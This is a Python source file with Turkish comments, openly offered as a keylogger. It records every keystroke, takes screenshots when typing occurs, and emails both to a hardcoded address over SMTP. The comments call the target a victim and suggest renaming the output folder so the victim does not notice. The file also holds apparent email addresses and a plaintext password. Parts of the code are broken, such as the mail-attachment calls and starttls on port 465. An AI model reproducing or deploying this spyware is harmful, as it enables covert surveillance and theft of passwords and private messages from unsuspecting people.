"""
Bendeniz SemsYapar kodlamıştır
Keyloggerımızın screenshot ve klavye kaydı özellikleri mevcuttur
son hali değildir geliştirilmeye ve değiştirilmeye açıktır
"""


import os
import threading
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from PIL import ImageGrab
from time import sleep
from pynput.keyboard import Key,KeyCode,Listener

class Keylogger:
    def __init__(self, count, konu, kimden, kime, password):
        self.count=count #veri aktarımı aralığını saniye olarak ifade eder isteğe bağlı olarak değiştirilebilir
        
        self.message = MIMEMultipart()
        self.message["Subject"] = konu
        #gmailin kimden gidiceğini belirtiniz
        self.message["From"] = kimden
        #gmailin kime gideceğini belirtiniz
        self.message["To"] = kime
        #gmail şifresi
        self.password = password 
    
        thread1 = threading.Thread(target = self.klavye_dinle)
        thread2 = threading.Thread(target = self.ss_bekle)

        thread1.start()
        thread2.start()

    def mail_at(self):
        #mesaj gövdesi
        self.message.attach(f"kurbanin ekran goruntuleri ve klavye hareketleri:\n\n{self.data}")
        with open(f"{self.ss_folder_name}\\{self.ss_name}","rb") as dosya:
                message_data = dosya.read()
                message_name = dosya.name
        self.message.add_attachment(message_data, maintype = "image", subtype = "png", filename = message_name)
        with smtplib.SMTP("smtp.yandex.com.tr",465) as server:#hangi mail servisi kullanıyorsanız buraya onun smtp adresini ve port numarasını yazın, daha az uğraştırdığı için yandex i tavsiye ediyorum
            server.ehlo()
            server.starttls()
            server.login(self.message["From"], self.password)
            server.send_message(self.message)
            server.quit()

    def klavye_dinle(self):
        self.data=""
        with Listener(on_press=self.klavye_kaydet) as klavye_dinle:
            klavye_dinle.join()
            
    def klavye_kaydet(self, harf):
        if type(harf) == Key:
            harf = "[{}]".format(harf).replace("Key.","").upper()
            self.data += harf
        if type(harf) == KeyCode:
            self.data += str(harf).replace("'","")
            
    def ss_bekle(self):
        temp=self.data
        try:
            self.ss_folder_name = "Data" #screenshotların yerleştirileceği klasörün ismi (kurbanın çakmaması için adını değiştirebilirsiniz)
            os.mkdir(self.ss_folder_name)
        except FileExistsError:
            pass
        while True:
            if len(temp)!=len(self.data):
                ss=ImageGrab.grab()
                self.ss_name = "ScreenShot.png" #dosya ismi isteğe bağlı uzantısı hariç değiştirilebilir
                ss.save(f"{self.ss_folder_name}\\{self.ss_name}","PNG")
                sleep(self.count)
                self.mail_at()
                self.data = ""
                os.remove(f"{self.ss_folder_name}\\{self.ss_name}")
                self.ss_bekle()
    
keylog1 = Keylogger(10, "Keylogs", "semsbaba@yandex.com", "safakn3@gmail.com", "Za12345@yandex" )
#kaç saniyede bir gönderilsin (bu etki tuş basımı tespit edildikten sonra devreye giricektir), mailin başlığı, gönderen adres, alıcı adres, gönderen şifre